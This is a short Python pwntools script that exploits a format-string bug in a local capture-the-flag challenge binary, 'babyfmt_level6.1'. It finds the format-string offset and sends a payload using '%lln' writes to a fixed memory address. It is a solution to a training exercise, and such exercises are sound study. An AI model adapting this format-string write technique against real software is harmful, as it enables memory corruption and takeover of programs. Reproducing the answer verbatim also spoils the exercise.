from pwn import *

context.arch = 'amd64'

def exec_fmt(payload):
    p = process("/challenge/babyfmt_level6.1")
    p.recv()
    p.send(payload)
    result = p.recvall()
    print(result)
    return result


fmtstr = FmtStr(exec_fmt)
print("fmtstr offset: {}".format(fmtstr.offset))
padding = b"A" * fmtstr.padlen

# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/babyfmt_level6.0", gdbscript="source /opt/gef/gef.py")
p = process("/challenge/babyfmt_level6.1")
payload = b'%*59$c%24$lln' + b"A" * 3 + padding + p64(0x404148)
print(payload)
p.send(payload)
a = p.recvall()